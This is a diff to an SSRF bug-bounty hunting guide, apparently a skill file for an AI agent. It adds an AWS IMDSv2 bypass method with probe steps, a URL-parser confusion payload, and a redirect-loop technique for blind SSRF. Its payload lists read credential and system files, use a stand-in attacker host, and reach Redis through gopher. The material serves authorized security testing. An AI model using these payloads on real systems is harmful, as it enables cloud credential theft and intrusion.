@@ -1,6 +1,6 @@
 ---
 name: hunt-ssrf
-description: Hunting skill for ssrf vulnerabilities. Built from 15 public bug bounty reports including AWS metadata SSRF (HackerOne $25k Analytics PDF, Shopify Exchange $25k, Capital One 106M-record breach, Dropbox/HelloSign $4,913), GCP metadata SSRF (Snapchat $4k), Azure IMDS SSRF (Azure DevOps $15k chain, ChatGPT Custom Actions MSRC), DNS rebinding SSRF (Concrete CMS, GitLab UrlBlocker), gopher-protocol-to-Redis-RCE (Yahoo Mail $15k), link-preview SSRF (Reddit Matrix $6k), and headless-browser PDF-generator SSRF chains. Use when hunting SSRF on any target — OOB Collaborator confirmation mandatory for blind cases.
+description: Hunting skill for ssrf vulnerabilities. Built from 34 public bug bounty reports including AWS metadata SSRF (HackerOne $25k Analytics PDF, Shopify Exchange $25k, Capital One 106M-record breach, Dropbox/HelloSign $4,913), GCP metadata SSRF (Snapchat $4k), Azure IMDS SSRF (Azure DevOps $15k chain, ChatGPT Custom Actions MSRC), DNS rebinding SSRF (Concrete CMS, GitLab UrlBlocker), gopher-protocol-to-Redis-RCE (Yahoo Mail $15k), link-preview SSRF (Reddit Matrix $6k), and headless-browser PDF-generator SSRF chains. Use when hunting SSRF on any target — OOB Collaborator confirmation mandatory for blind cases.
 sources: github, hackerone_public, portswigger_research, binarysecurity_research
 report_count: 34
 ---
@@ -255,6 +255,16 @@ file:///var/run/secrets/kubernetes.io/serviceaccount/token
 file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
 ```
 
+### AWS IMDSv2 — what it blocks and what still gets through
+IMDSv2 needs a session token: `PUT /latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds: <n>`, then every metadata request carries `X-aws-ec2-metadata-token: <token>`. AWS added two guards: the token reply leaves with an IP TTL (PUT response hop limit) of 1 by default, and IMDSv2 does not issue tokens to a caller that sends `X-Forwarded-For` (AWS Security Blog, "Add defense in depth against open firewalls, reverse proxies, and SSRF vulnerabilities with enhancements to the EC2 Instance Metadata Service"). An IMDSv2-only instance is still reachable when the SSRF gives you the first two of these, plus the third when the fetcher runs in a container:
+- **Method + header control** — a webhook / HTTP-request builder that lets the user pick `PUT` and set headers, or CRLF injection into the outbound request (the Azure DevOps chain below used CRLF to add `Metadata: true`).
+- **No proxy-added `X-Forwarded-For`** on the path to IMDS.
+- **Hop budget** — from a container, the token reply only arrives if the node's hop limit was raised to 2 (AWS's own advice for container workloads); at 1 it dies at the container's extra hop.
+
+Canonical case: **Typebot CVE-2025-64709** (fixed in 3.13.1) — the webhook block's HTTP request feature let an authenticated user inject custom headers, bypass IMDSv2 and pull the **EKS node role's** temporary credentials ([NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-64709)).
+
+Probe order, stop at the first step that fails: (1) `GET http://169.254.169.254/latest/meta-data/` — a `401` means the service answers and wants a token; (2) `PUT /latest/api/token` with the TTL header — a token string back proves the PUT path; (3) replay a metadata read with `X-aws-ec2-metadata-token`. Prove access with the role name or an identity call only, then hand off to `cloud-iam-deep`.
+
 ### Localhost/Internal Port Payloads
 ```bash
 # Kubernetes internals
@@ -338,13 +348,15 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
 
 6. **Internal hostname leakage via response differences** — Services return different error messages, timing, or response sizes for internal vs. external hosts, enabling blind enumeration even when content isn't returned.
 
-7. **IMDSv1 still enabled** — Cloud deployments that haven't migrated to IMDSv2 (AWS) or haven't required the `Metadata-Flavor` header (GCP) allow unauthenticated credential access from any SSRF.
+7. **IMDSv1 still enabled** — Cloud deployments that haven't migrated to IMDSv2 (AWS) or haven't required the `Metadata-Flavor` header (GCP) allow unauthenticated credential access from any GET-capable SSRF. IMDSv2 narrows this but does not end it: an SSRF with method + header control, or one running in a container on a hop-limit-2 node, still reaches credentials (see "AWS IMDSv2" above).
 
 ---
 
 ## Bypass Techniques
 
 ### Blocklist Bypasses (When `localhost`, `127.0.0.1`, `169.254.x.x` are blocked)
+
+For the full generated set (encodings, IP forms, allowlist-host confusions) feed your allowed host and internal target into PortSwigger's **URL validation bypass cheat sheet** — https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet — and run the exported wordlist through Intruder or ffuf. The table below is the starting subset.
 
 ```
 # IPv6 equivalents
@@ -372,11 +384,12 @@ http://evil.example@127.0.0.1/
 http://127.0.0.1#evil.example
 http://127.0.0.1%25@evil.example  (URL encoding)
 http://evil.example\.127.0.0.1/   (backslash)
+http://localhost:\@google.com/../   (urlparse sees google.com, requests connects to localhost — CVE-2025-0454, AutoGPT < 0.4.0)
 
 # Protocol confusion
 file:///etc/passwd
 dict://127.0.0.1:6379/
-gopher://127.0.0.1:6379/_FLUSHALL  (Redis via gopher)
+gopher://127.0.0.1:6379/_PING  (Redis via gopher; read-only probe, never FLUSHALL/CONFIG SET on a target)
 sftp://attacker.example:11111/
 ldap://127.0.0.1/
 
@@ -422,6 +435,7 @@ http://169.254.169.254:80@evil.example/
 - Register a domain with 0-TTL, rotate DNS between validation and fetch calls
 
 ### When Response is Not Returned (Blind SSRF)
+- **Redirect loops can surface the response** (Shubham Shah, Searchlight Cyber, Jun 2025, "Novel SSRF Technique Involving HTTP Redirect Loops", https://slcyber.io/research-center/novel-ssrf-technique-involving-http-redirect-loops/ — PortSwigger Top 10 of 2025 entry 3). Host a chain whose hops step through different 3xx codes (301, 302, … 310) before the final target. In their case the app (libcurl following redirects) hit an unhandled error state past a handful of redirects and returned the whole chain, final body included, where a single redirect returned nothing. The authors hedge the root cause, so treat it as a technique to try on any blind fetcher that follows redirects, not a guaranteed leak.
 - Use DNS-only callbacks (data encoded in subdomain labels)
 - Use timing differences for port scanning
 - Use different HTTP methods (PUT/DELETE) to trigger distinct behaviors on internal services
